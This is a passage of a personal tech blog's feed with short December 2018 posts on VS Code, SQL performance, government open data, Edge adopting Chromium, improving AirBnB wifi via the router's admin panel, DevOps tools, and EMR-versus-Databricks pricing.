   <updated>2018-12-25T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/25/happy-holidays-from-visual-studio-code</id>
   <content:encoded><![CDATA[
<img src="http://dangoldin.com/assets/static/images/vs-code-falling-snow.png" alt="Visual Studio Code falling snow" width="2422" height="1920" layout="responsive"/>

<div class="right10">
    <img src="http://dangoldin.com/assets/static/images/vs-code-santa-settings.png" alt="Visual Studio Code Santa settings" width="130" height="144" layout="responsive"/>
</div>

<p>Visual Studio Code has been my go-to editor since the beginning of 2017 and I’m a huge fan. They reinforced my belief with a little Easter egg earlier today to celebrate Christmas. The settings icon in the bottom right corner got a special Santa hat and clicking on it gives you an additional menu option labeled “Happy Holidays!” which gives you a friendly holiday message along with some falling snow.</p>

<p>I love it when products don’t take themselves too seriously and add a little bit of fun. It’s refreshing to see something done just because it’s fun without requiring a fully fleshed out business case. The best products realize they will be used by humans and Easter eggs reinforce that.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Solve all web app performance problems with SQL</title>
   <link href="http://dangoldin.com/2018/12/24/solve-all-web-app-performance-problems-with-sql/"/>
   <updated>2018-12-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/24/solve-all-web-app-performance-problems-with-sql</id>
   <content:encoded><![CDATA[
<p>The title is clearly tongue in cheek but a very large number of web application issues can be solved through better SQL. Web applications performance problems are either UI or API related. And if the performance is on the API side it’s likely due to slow queries. The majority of endpoints are doing some form of database interaction and many are making multiple database calls. It only takes one of these to be slow to make the entire application feel sluggish - especially if you have lots of concurrent requests to this endpoint. This often happens when you rely on an ORM to manage your database reads and writes without understanding the queries that are actually being made. An ORM makes it much easier to get started but to get the best performance you need to go lower level and write your own queries. The way to dig into these is to look at the slow query log which gives you (at least in MySQL) both the query, the duration, and the amount of rows examined and sent. Sorting by the query duration gives you a the worst performing queries and then it’s up to you to address them. Sometimes it’s adding a few indices to a table. Other times it’s rewriting the query to be more efficient. Even more rarely it highlights a weakness in the application logic that requires rethinking a particular approach.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Open, Public, Electronic, and Necessary Government Data Act</title>
   <link href="http://dangoldin.com/2018/12/24/open-public-electronic-and-necessary-government-data-act/"/>
   <updated>2018-12-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/24/open-public-electronic-and-necessary-government-data-act</id>
   <content:encoded><![CDATA[
<p>The US Congress recently <a href="https://e-pluribusunum.org/2018/12/21/congress-made-open-government-data-the-default-in-the-united-states/">passed</a> <a href="https://www.govtrack.us/congress/bills/115/hr4174">HR-4174</a> (The Open, Public, Electronic, and Necessary Government Data Act) which is intended to make all public government data available and accessible. Over the years I’ve done my fair share of poking around various government datasets - both public and private - and while the data was generally available it was rarely accessible. More often than not the data would be available via a scanned PDF which required some heavy OCR work to extract anything useful or the slightly easier PDF parsing code. Even when the data was in CSV files I often ran into formatting issues or inconsistency between the column documentation and the data contents themselves. The most important available datasets will always have people willing to go through the grunt work of cleaning them up but it’s the fringe datasets that end up having too much friction for researchers and developers to dig into them. I’m glad the government is moving to make the data accessible as well since it is the strongest way to make it actionable.</p>

<p>It’s definitely not going to perfect to start as it’s incredibly difficult to get consistent and clean data. Imagine a survey being done every decade. An obvious way to structure it is to have a set of files for each decade containing a description of the available fields and then a file containing the data itself. You can have each survey’s files being internally consistent but there are no guarantees that they will be consistent across surveys. What if some fields or questions were renamed, added, or removed? That makes it more difficult to compare the results over time. To maintain consistency across years all of the surveys would need to be a part of the same data set and use consistent values and formatting in order to make it dead simple to compare one year to another.</p>

<p>In an ideal world the datasets would actually come in prepackaged as database dumps. Then you’d be able to just load into your database with the appropriate database definitions, foreign keys, and field constraints. I can’t wait till the day all government data is in <a href="https://en.wikipedia.org/wiki/Third_normal_form">third normal form</a>.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Calendars as streaming events</title>
   <link href="http://dangoldin.com/2018/12/24/calendars-as-streaming-events/"/>
   <updated>2018-12-24T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/24/calendars-as-streaming-events</id>
   <content:encoded><![CDATA[
<p>I like calendars. They appeal to both my sense of organization and efficiency but also to the actual depth of the technical implementation. It’s not easy creating a good calendar application - you have to think about all sorts of edge cases - for example rescheduling an event that was part of a recurring series or the usual time zone nonsense. A thought I keep going back to is treating calendars as event streams. Right now I have a personal calendar as well as a few others that are shared with different groups. Using code it’s possible to collect the events across these calendars and then apply various operations on top of them - find events that overlap, find people that overlap, analyze the event frequencies, etc but this has to be done through very specific logic. I love the idea of calendars just consistent of event streams. That way you can apply transformations on top of the streams to answer any questions you have. I imagine this to be a form of lazy list expression or even something like a SQL query that would allow me to take all the events I have going on and apply a map/reduce like operation to get what I need. This still feels a bit abstract and I need to flesh out the idea a bit more but I feel there’s something here - just being able to treat your calendar as a single stream and provide a simple way to act on top of them.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Quora's revenue model</title>
   <link href="http://dangoldin.com/2018/12/23/quoras-revenue-model/"/>
   <updated>2018-12-23T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/23/quoras-revenue-model</id>
   <content:encoded><![CDATA[
<p>While browsing a Hacker News thread about Quora I came across the following exchange:</p>

<img src="http://dangoldin.com/assets/static/images/hackernews-quora-revenue-model.png" alt="Hacker News thread about Quora's revenue model" width="2604" height="676" layout="responsive"/>

<p>I had always assumed Quora made money through ads and didn’t even consider that they had another revenue stream. The Hacker News thread indicates that they have a substantial revenue stream coming from selling the Q&amp;A data to AI/ML companies but I haven’t been able to find anything else that supports this. Part of the difficulty in searching for results is that just by typing in “Quora” the results are biased towards Quora itself.</p>

<p>If, in fact, Quora does sell its Q&amp;A data it’s an interesting move - it’s similar to Duolingo’s revenue model which gives users free language learning exercises and in turns sells translation services powered by those same users.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>HackerRank</title>
   <link href="http://dangoldin.com/2018/12/22/hackerrank/"/>
   <updated>2018-12-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/22/hackerrank</id>
   <content:encoded><![CDATA[
<p>These days I rarely code during work since there’s other work to be done but I miss it. Lately I’ve started working on some <a href="https://www.hackerrank.com">HackerRank</a> problems. They send me a problem a day and nearly every time I’ve been able to knock out a solution in a few minutes. It feels as if I’m keeping my skills sharp and gives me that quick win. Every once in a while I’ll pick up an old project to hack on but that’s a very different style of coding. That’s more focused on understanding modern frameworks and web development while HackerRank problems are entirely standalone and tend to be logic based that often depend on finding the insight before coding up the solution:: they’re basically a poor man’s version of <a href="https://projecteuler.net">Project Euler</a>. I know most people use them to prepare for interviews but I like using them for the challenge and the win.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Edge moving to Chromium</title>
   <link href="http://dangoldin.com/2018/12/22/edge-moving-to-chromium/"/>
   <updated>2018-12-22T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/22/edge-moving-to-chromium</id>
   <content:encoded><![CDATA[
<p>I’m a bit late to the party but it’s unbelievable that Microsoft is going to <a href="https://www.windowscentral.com/microsoft-building-chromium-powered-web-browser-windows-10">move future versions</a> of Edge to be built on top of Chromium. This is shocking. I can’t separate Internet Explorer from Microsoft. In fact, Microsoft built, launched, and bundled Internet Explorer to drive Netscape into the ground which led to the famous Microsoft <a href="https://en.wikipedia.org/wiki/United_States_v._Microsoft_Corp.">antitrust case</a>. It feels as if Microsoft is giving up on Internet Explorer and it’s incredibly surprising. This is bigger than any of the other moves Microsoft has done to show they are a very different company. This is more significant than the GitHub acquisition. This is more significant than supporting their applications on operating systems other than windows. This is moving away from 20 years of history and it shows how different the current Microsoft is from the one of the past. I would have loved to have been a fly on the wall when this decision was discussed - there must have been so much passion in that room. There must have been so many viewpoints: ranging from those that have been working on IE for the past 20 years, to the product team that’s responsible for the future of IE, to the executive team that needed to make the call. It really is surprising that they had the strength and conviction to be able to acknowledge that they’d be better off using Chromium.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Global roaming</title>
   <link href="http://dangoldin.com/2018/12/21/global-roaming/"/>
   <updated>2018-12-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/21/global-roaming</id>
   <content:encoded><![CDATA[
<amp-youtube data-videoid="TviGil-U2HE" layout="responsive" width="640" height="480"></amp-youtube>

<p>It’s amazing how quickly we become entitled to new technological advances. Back in 2008 Louis C.K. had a bit on the Conan O’Brien late night show about airplane wifi and how despite the miracle of actually having wifi on an airplane we still have the gall to complain about the speed.</p>

<p>My modern equivalent is global roaming. I have T-Mobile which offers free global roaming as part of their standard plan and it’s amazing being able  to travel that way. So much of the modern world’s amenities depend on being online at any time that I can’t imagine traveling without it. Using Uber or Lyft would be significantly more difficult. Same for the electric scooter rental apps that require scanning a QR code. Or just being able to quickly look up your location to figure out where you are and how to get to your destination.</p>

<p>All of these are surmountable by findign a nearby wifi spot or talking to a stranger but it’s just so much more convenient with a constantly-on internet connection. And despite T-Mobile offering global data for free I can’t help but complain that it’s just too slow at the offered 2G speeds. I can still do everything I need but it just takes longer and I’m not used to it. Yet only a few years ago I remember having to constantly be on the lookout for places with wifi just to be able to go online. It really is the modern day version of slow plane wifi.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>FIxing spotty AirBnB wifi</title>
   <link href="http://dangoldin.com/2018/12/21/fixing-spotty-airbnb-wifi/"/>
   <updated>2018-12-21T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/21/fixing-spotty-airbnb-wifi</id>
   <content:encoded><![CDATA[
<p>Nearly every time I travel I use AirBnB but a fairly common problem is spotty wifi. I don’t know whether my expectations are higher than the typical guests but in a significant number of my stays the wifi has been spotty. Rather than complain or just accept it I’ve started doing my own simple wifi network maintenance to help improve the speed. The nice thing thing is that this is entirely doable - both because you can connect to the network but also because you have access to the physical router.</p>

<p>The critical piece is being able to access the router’s admin panel. This is usually hosted at the router’s IP address which, on a Mac, you can find by holding the Option button while clicking the wifi icon in the top toolbar. This gives you a router IP address which is usually 192.168.0.1 or 192.168.1.1. There’s going to be a login page but people rarely change the default username/password and these can be found either online via some Googling of “router model default admin password” or by looking at stickers on the router itself. As a last resort you can physically reset the router to factory settings but you need to make sure you know what you’re doing since you will be reverting all the settings and potentially causing significant issues.</p>

<p>Now that you have access to the router’s admin panel you can poke around and see if there are any settings or options that look useful. I usually try to disable all the bells and whistles to focus on actual wifi speed and latency but the biggest help is just picking the appropriate channel. If you live in an apartment building your wifi signals will overlap with those from other apartments. This means that if you’re using the same channel as everyone else there will be a lot of noise which will hurt your performance. The nice thing is that OS X (and I’m sure other OSes have their own equivalents) comes with a utility called “Wireless Diagnostics” which lets you scan all the wifi networks to determine the best channel to use - which is the one that has the least overlap with others. Once you run the scan and get the optimal channel you would just make that the default channel in the router’s wifi settings and you should be good to go. Modern routers come with a gamut of options and customizations but I’ve found that picking the optimal channel gets you most of the way there.</p>

<img src="http://dangoldin.com/assets/static/images/wifi-scan-osx.png" alt="OS X Wireless Diagnostics" width="3214" height="696" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Tech startups are not the only ones taking risks</title>
   <link href="http://dangoldin.com/2018/12/20/tech-startups-are-not-the-only-ones-taking-risks/"/>
   <updated>2018-12-20T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/20/tech-startups-are-not-the-only-ones-taking-risks</id>
   <content:encoded><![CDATA[
<p>This post has been sitting on my to-write list for multiple years now but it’s a topic I’ve been meaning to write ever since my Makers Alley experience. When we created Makers Alley the goal was to create a marketplace for local designers, woodworkers, and metalworkers to offer their pieces for sale along with some customization. To get the marketplace started we had dozens of meetings with these artists describing what we were trying to do, explaining the product, taking photos, and generally pitching to get them signed up.</p>

<p>We never got the traction we wanted but during the time I met a ton of wonderful and passionate people who were looking to make a living designing and making furniture. This was a world far away from tech and it was thrilling to be a part of it. To get started in tech all you need is a laptop but the people we met were spending tens of thousands of dollars on the spaces, the tools, and the supplies just to get started with no idea if they’d be successful or not. They had a vision and were passionate enough to get into debt to pursue them. Being in the tech world we admire founders who quit their jobs to do a startup but we shouldn’t forget that there are people giving up more, risking more, and all to pursue their passion.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>New iteration of DevOps</title>
   <link href="http://dangoldin.com/2018/12/19/new-iteration-of-devops/"/>
   <updated>2018-12-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/19/new-iteration-of-devops</id>
   <content:encoded><![CDATA[
<p>While catching up on some tech news today I discovered <a href="https://opsmop.io">OpsMop</a> and <a href="https://vespene.io">Vespene</a>. Both of these are new DevOps tools from Michael DeHaan, the creator of Ansible. Before we had a DevOps team I was doing the bulk of our AWS management through the AWS console as well as a few command line scripts but as soon as we had a real DevOps that introduced the modern DevOps stack (Ansible, Terraform, Packer, Kubernetes) I was hooked. Doing the work through the AWS console is quick and easy but inevitably leads to inconsistencies that get worse and worse as your stack gets more and more complicated.</p>

<p>I don’t have the depth that most experienced DevOps engineers have and have been happy with Ansible for my current projects. At the same time the fact that the creator of Ansible thought there was a need for something new makes me think he’s on to something. I have very little invested in Ansible and I’m going to do the work to move it over to OpsMop. In addition, none of my personal projects have any CI/CD and actually giving them a real deployment pipeline using Vespene seems like a fun little project</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Facebook's latest hit</title>
   <link href="http://dangoldin.com/2018/12/19/facebooks-latest-hit/"/>
   <updated>2018-12-19T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/19/facebooks-latest-hit</id>
   <content:encoded><![CDATA[
<p>The Facebook hits just keep on coming. The latest is a <a href="https://www.nytimes.com/2018/12/18/technology/facebook-privacy.html">NY Times expose</a> around Facebook’s lack of privacy or data protection when it came to their strategic partner integrations. Citing some examples won’t do it justice and the entire article is worth a read just to see how loose Facebook was with user data. It’s shocking how ridiculous some of these practices were. I’m not surprised by the data Facebook is collecting or how it’s being used for ad targeting but I’m amazed at how much data they allowed to leave their platform. Facebook’s entire bread and butter is user data and letting it leave the “walled garden” for some short term benefit was misguided. It’s impossible to get that data back and especially now with everyone eagerly looking for Facebook’s missteps it makes them look especially imprudent.</p>

<p>It really does seem Facebook doesn’t understand their data. On one hand they’re leveraging the hell out of it to advance their product but on the other hand they’re extremely cavalier with it. A while back someone made the point that Facebook sees user data as their own and not belonging to their users and therefore are not treating it with the care that it deserves. At the time that was a nice sound bite but felt wrong since Facebook’s entire business model is predicated on them taking care of user data. Unfortunately, the latest bit of news has me questioning Facebook’s ability and incentive to actually safeguard user data.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>I finally tried an electric scooter</title>
   <link href="http://dangoldin.com/2018/12/18/i-finally-tried-an-electric-scooter/"/>
   <updated>2018-12-18T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/18/i-finally-tried-an-electric-scooter</id>
   <content:encoded><![CDATA[
<p>I live in the NYC area which has Citi Bike but doesn’t allow any scooter companies to operate. In fact it actually disallows any electric bikes/scooters/skateboards/hoverboards and only makes an exception for pedal-assisted bikes. And since I haven’t been traveling much the closest I could get to trying an electric scooter was reading the endless series of articles about them.</p>

<p>Luckily for me I went on a vacation to Mexico City and got the chance to try a Lime scooter. It was great. I use Citi Bike whenever I can in NYC so I didn’t expect the scooters to be that much different but it felt much more liberating with significantly less friction. The big difference is that there is no docking station which is always a concern in NYC: a station may be empty when I’m looking for a bike or a station is full and I need to dock a bike. The electric powered also makes it much easier to just hop on and go. I don’t mind the Citi Bike pedaling but the scooter only needed a small kick-start and then quickly accelerated to over 14 mph. The scooter was also much smaller and lighter than a Citi Bike which added to the feeling.</p>

<p>I read some articles complaining about the clutter introduced by these scooters but didn’t feel any of that. Sure there were random scooters in random places but it never felt overwhelming and actually made me appreciate them more knowing that they’re so easily accessible. I’m not surprised that they haven’t made their way into NYC yet but hope they’re able to in the future.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The new company town</title>
   <link href="http://dangoldin.com/2018/12/17/the-new-company-town/"/>
   <updated>2018-12-17T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/17/the-new-company-town</id>
   <content:encoded><![CDATA[
<p>A few months ago I read an article describing Amazon’s <a href="https://www.theinformation.com/articles/amazon-considers-offering-home-insurance">potential move</a> to offer home insurance. The premise is that Amazon is incredibly strong operationally and both their integration of Echo into all things home and their acquisition of Ring gives them valuable signals that the typical insurer does not have.</p>

<p>I couldn’t help but think back to the 19th century where companies were large enough to <a href="https://en.wikipedia.org/wiki/Company_town">own</a> all the property in a town and have their employees live there. As one can imagine it was extremely exploitative since you had the company that paid you also collect money from you for your housing. They died down in the 20th century but this feels like a step in that direction. We’re clearly not all going to work for Amazon but the idea of having a single company vertically integrating around our lives seems a bit dystopian.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Stuck on a problem? Take a break</title>
   <link href="http://dangoldin.com/2018/12/16/stuck-on-a-problem-take-a-break/"/>
   <updated>2018-12-16T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/16/stuck-on-a-problem-take-a-break</id>
   <content:encoded><![CDATA[
<p>When struggling with a difficult problem that I just can’t figure out I’ve found that it helps to just stop focusing on it and work on something else. Oftentimes that break is enough to get the problem into the subconscious where after a bit of stewing it just clicks. It may feel as if you’re admitting defeat and giving up but that break gives you the respite that is necessary to find the passive inspiration to solve a problem. People say that they often have the best ideas in the shower - in fact Archimedes supposedly found his “Eureka” moment in the bathtub - but I get my moment of inspiration when I’m either waking up, falling asleep, or doodling. In all those cases my mind is wandering and miraculously decides that it actually wants to tackle the problem.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Overanalyzing Medium's tag suggestions</title>
   <link href="http://dangoldin.com/2018/12/15/overanalyzing-mediums-tag-suggestions/"/>
   <updated>2018-12-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/15/overanalyzing-mediums-tag-suggestions</id>
   <content:encoded><![CDATA[
<div class="right10">
    <img src="http://dangoldin.com/assets/static/images//medium-suggestions-startup.png" alt="Medium's tag suggestions for startup" layout="fixed" width="176" height="200"/>
</div>

<p>While I keep my primary blog on dangoldin.com I also cross post to Medium to get some more views but also because I’m curious to compare the performance. While adding tags to one of these posts I typed in startup and saw the following suggestions and their frequencies: Startup (334K), Startup Lessons (10.8K), Startup Life (3.6K), Startup Marketing (2.3K), and Startup Ideas (1.1K).</p>

<p>The frequencies stood out. It makes sense that the generic term “startup” would have the highest volume but it’s interesting to see how the others compare. I was surprised that the second highest, Startup Lessons, was only 3% of the first one. I was also surprised that the next two were Startup Lessons and Startup Life - they’re both about the same topic but it seems lessons is someone writing about the past while life is someone writing about the present. I suspect it’s catharsis where founders want to write about their mistakes while far fewer want, or have the time, to write about their current startup experience. I know when I was working on my startup I definitely didn’t have the time for writing but at the end it felt great to do a brain dump of everything I learned along the way.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>New code is not a linear increase in complexity</title>
   <link href="http://dangoldin.com/2018/12/15/new-code-is-not-a-linear-increase-in-complexity/"/>
   <updated>2018-12-15T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/15/new-code-is-not-a-linear-increase-in-complexity</id>
   <content:encoded><![CDATA[
<p>When it comes to software development we often add features simply because it’s easy. And almost always they are - just add an additional optional argument or two to a function and suddenly you’ve expanded your application’s functionality. The catch is that this assumes that this new code is a linear increase in complexity but it’s not.</p>

<p>Computer science has the concept of “<a href="https://en.wikipedia.org/wiki/Big_O_notation">Big O notation</a>” to measure how a function behaves as a function of it’s input. A “Big O” of O(N) is linear while O(N^2) is quadratic. The implicit goal is that you should strive to write your code to minimize it’s complexity with the ultimate goal being O(1). The same approach can be applied to code complexity. How much will the new functionality affect the complexity of the code? A seemingly simple code change may change the “exponent” of your code’s complexity and a complex code change may actually reduce your code complexity. The code change is not always correlated with the complexity that is being introduced.</p>

<p><a href="https://en.wikipedia.org/wiki/Cyclomatic_complexity">Cyclomatic complexity</a> was a concept introduced in the 70s to measure code complexity. It does so by measuring the number of branches in your code. A simple example is to think about a simple “if” statement: just adding a condition adds a new flow to your code which may have further implications down the line. The concept is more than 40 years old and is still incredibly useful in keeping ourselves honest.</p>

<p>Adding a single feature is often easy and so we do it but we don’t consider the fact that dozens of these small changes increase the overall complexity of the code significantly. This makes future code changs more difficult to make, test, and maintain. It’s critical to think of the code you’re writing not purely in terms of the complexity of the code itself but of the complexity it introduces to the the rest of the code base.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>State of tech in 2018</title>
   <link href="http://dangoldin.com/2018/12/14/state-of-tech-in-2018/"/>
   <updated>2018-12-14T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/14/state-of-tech-in-2018</id>
   <content:encoded><![CDATA[
<p>I’m a big fan of the <a href="https://stratechery.com/">Stratechery</a> newsletter and eagerly read every article that comes out. This past week a post came out that gave a wonderful description of the <a href="https://stratechery.com/2018/the-state-of-technology-at-the-end-of-2018/">state of tech in 2018</a>:</p>

<blockquote>
  <p>This, then, is the state of technology in 2018: the enterprise market is thriving, and the consumer market is stagnant, dominated by the “innovations” that a few large behemoths deign to develop for consumers (probably by ripping off a smaller company). Meanwhile a backlash is brewing on both sides of the political spectrum, but with no immediately viable outlet through competition or antitrust action, the politics surrounding technology simply becomes ever more rancid.</p>
</blockquote>

<p>This felt like such a potent and accurate summary of 2018 that I wanted to repot it here. It does feel as if there’s no room for consumer apps anymore and yet we’re seeing a ton of competition in the enterprise. This is the opposite of the world 15 years ago when the enterprise world felt static and the consumer world was alive. I like to think that the tech world goes in cycles and in another 15 years (hopefully sooner) we’ll be in a renaissance of consumer tech.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Counting the number of lines of code in a GitHub account</title>
   <link href="http://dangoldin.com/2018/12/13/counting-the-number-of-lines-of-code-in-a-github-account/"/>
   <updated>2018-12-13T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/13/counting-the-number-of-lines-of-code-in-a-github-account</id>
   <content:encoded><![CDATA[
<p>It’s surprisingly difficult to count the number of lines of code in a GitHub account. One day I’d like to come up with a fully automated solution but in the meantime I’ve come up with a workaround that gets me what I need.</p>

<ol>
  <li>Follow the steps in the following <a href="https://stackoverflow.com/a/29012789">Stack Overflow</a> answer to create your own command, cloc-git, that fetches a repo and runs another utility, <a href="https://github.com/AlDanial/cloc">cloc</a>, that counts the number of lines in a git repo.</li>
  <li>Get all your repos into a single file, one per line.</li>
  <li>Bulk edit the file to have each line be an invocation of the clock-git command and save them all to a single file. For example, a single line of the file should be of the format: cloc-git git@github.com:dangoldin/dangoldin-blog.git</li>
  <li>In the command line simply execute the file and pipe into an output file, for example sh loc.sh &gt; lines-of-code</li>
  <li>Once the previous step succeeds you’ll have a single text file with the output of the cloc-git command for every specified repo but the formatting is not the easiest to follow.</li>
  <li>Run a simple grep command to get every line containing the SUM line: grep “SUM” lines-of-code and save this to the clipboard</li>
  <li>Unfortunately the spacing is all off so you can’t use the cut command to do a split via the shell so you have to use a simple programming language. I used python and just dumped the contents into a single variable and ran the following command to split it into lines and then retrieve the last value when splitting by a space.</li>
  <li>Once you have these values just do a simple sum to get the total number of lines.</li>
</ol>

<p>It’s not very simple and forces you to use a variety of tools to get to the final result, ranging from reading Stack Overflow documentation to some shell commands to some Python scripting. It’s a good example of where having enough breadth of knowledge and experience with a variety of tools turns a hairy problem into one that can be solved relatively quickly. It’s not a perfect solution but for a one-off I’m happy with the results.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Scenepeek</title>
   <link href="http://dangoldin.com/2018/12/12/scenepeek/"/>
   <updated>2018-12-12T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/12/scenepeek</id>
   <content:encoded><![CDATA[
<p>Way back when as I was just leaving the finance world to go into tech I attempted a startup with a friend called Scenepeek. The goal was to constantly aggregate all of a city’s events and make them easily searchable and discoverable by people who were looking to do something. Since both of us were in NYC and there are always a ton of events we decided that it would be the perfect candidate. We built a ton of scrapers optimized for all sorts of different sites, created a data model that was able to support nearly any type of event, and ended up launching a pretty crude but functional site. It never succeeded but we learned a ton throughout the process.</p>

<p>I often think back to it given all the knowledge I’ve picked up over the past 10 years and wonder what we could have done differently and whether it would have made a difference. We launched around the time that the first iPhone was released but before apps were allowed and never even considered the mobile angle. I still believe it’s a great idea that was ahead of its time but the fact that there’s still nothing equivalent makes me wonder. The closest would be something like Swarm but that’s not so much about events as it is about places. Maybe the closest equivalent is actually Facebook Events but the events on there feel more private. Scraping every event is difficult but given how much technology and tooling has improved over the past decade it seems there should be something there. The learning experience was great and introduced me to the startup world but a tiny part of me wonders what would have happened had we started a tad later and leaned into mobile.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The price of AWS vs GitHub</title>
   <link href="http://dangoldin.com/2018/12/11/the-price-of-aws-vs-github/"/>
   <updated>2018-12-11T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/11/the-price-of-aws-vs-github</id>
   <content:encoded><![CDATA[
<p>This is a bit of an odd comparison since they offer two very different services with very different cost models but it’s just incredible how much more expensive AWS is than GitHub. It makes sense that GitHub is significantly cheaper since it’s fundamentally just git hosting and it has virtually zero marginal costs to support new customers. AWS on the other hand is bills entirely based on usage and has to allocate the additional hardware for every customer and is definitely not zero marginal cost. Yet they’re both integral in the modern tech ecosystem and are used extensively by companies and startups.</p>

<p>There’s nothing out of the ordinary here and it’s just useful to take a step back every once in a while and think about the tools and products we use, how they fit into our workflows, and how much we pay for each. In this case they’re both incredibly valuable to us yet one is orders of magnitude cheaper than the other.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>EMR vs Databricks costs</title>
   <link href="http://dangoldin.com/2018/12/10/emr-vs-databricks-costs/"/>
   <updated>2018-12-10T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/10/emr-vs-databricks-costs</id>
   <content:encoded><![CDATA[
<p>It’s frustrating when vendors introduce their own currency in what seems to be a way to obfuscate pricing. The most recent example is Databricks which offers a slick Spark hosting solution on top of AWS and Azure. Unfortunately, instead of being explicit about the prices they introduced a Databricks Unit (DBU) currency type that then translates into dollars based on the type of usage - ranging from a simple Spark cluster with limited optimizations (Basic Plan) to an interactive one with all sorts of behind the scenes performance tweaks (Data Analytics Plan).</p>

<p>The nice thing is that <a href="https://databricks.com/product/aws-pricing/instance-types">Databricks is transparent</a> about the amount of DBUs per EC2 instance and the price per DBU so it took a bit of data cleanup to dump everything into a <a href="https://docs.google.com/spreadsheets/d/1WnHBixRBXw0PhKfA0XidgNQN1sM0TEHRCxFHL6laEHY/edit#gid=0">spreadsheet</a> and then do the lookups and math to compare the <a href="https://aws.amazon.com/emr/pricing/">EMR</a> vs <a href="https://databricks.com/product/pricing">Databricks</a> pricing.</p>

<p>Turns out that the Databricks Basic plan is comparable to standard EMR - in some cases it’s more expensive and in some cases it’s significantly cheaper. For example an i2.xlarge costs $0.213/hour in AWS EMR but 1.5 DBUs (equivalent to $0.105/hour) in Databricks. At the same time an i3.16xlarge costs $0.270 in AWS EMR but 16 DBUs (equivalent to $1.120/hour) in Databricks. That’s a huge range, the i2.xlarge is less than half the cost in Databricks but the i3.16xlarge is more than 4 times as much in Databricks than in AWS. In general Databricks is more expensive for the larger instance types and cheaper for the smaller ones and I’d be curious to understand the reasoning. Also note that this is just using the Basic plan - Databricks has other plans which are never cheaper than the EMR equivalent.</p>

<p>I’ve included a screenshot of the analysis below but all the data is also available on a shared <a href="https://docs.google.com/spreadsheets/d/1WnHBixRBXw0PhKfA0XidgNQN1sM0TEHRCxFHL6laEHY/edit#gid=0">Google Spreadsheet</a>.</p>

<img src="http://dangoldin.com/assets/static/images/emr-vs-databricks.png" alt="EMR vs Databricks costs by instance type" width="2168" height="1402" layout="responsive"/>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>The modern economy relies on information</title>
   <link href="http://dangoldin.com/2018/12/09/the-modern-economy-relies-on-information/"/>
   <updated>2018-12-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/09/the-modern-economy-relies-on-information</id>
   <content:encoded><![CDATA[
<p>In many ways modern capitalism is about bigger and bigger companies owning more and more industries. We’re seeing with the major tech companies moving into new verticals to keep growing. We’re seeing it with the media and telecom companies going on acquisition sprees aimed at both vertical integration and horizontal scale.</p>

<p>Yet there are also ton of small business being launched across a variety of industries - especially in consumer products. The world is much more open now and if you offer something unique and compelling it’s easier to find customers than at any other time in history. You don’t need to invest in a ton of marketing or advertising so long as you know your audience and figure out the best channels to reach them.</p>

<p>The modern world is great at reducing friction. At first it was friction in the transport of physical goods with the standardization of the shipping container and railroads. Now it’s the reduction in information friction. In the past it made a ton of sense to vertically integrate your business and control each step so you can control as much as possible. That’s still advantageous if you can swing but but it’s so much easier to be small and access the transparent market to find what you need. There are numerous vendors for anything you need and you can find exactly what you need. Moving from small to medium is a whole other story but it’s easier to be smaller than ever.</p>
]]></content:encoded>
 </entry>
 
 <entry>
   <title>Avoiding content overload</title>
   <link href="http://dangoldin.com/2018/12/09/avoiding-content-overload/"/>
   <updated>2018-12-09T00:00:00-05:00</updated>
   <id>http://dangoldin.com/2018/12/09/avoiding-content-overload</id>
   <content:encoded><![CDATA[
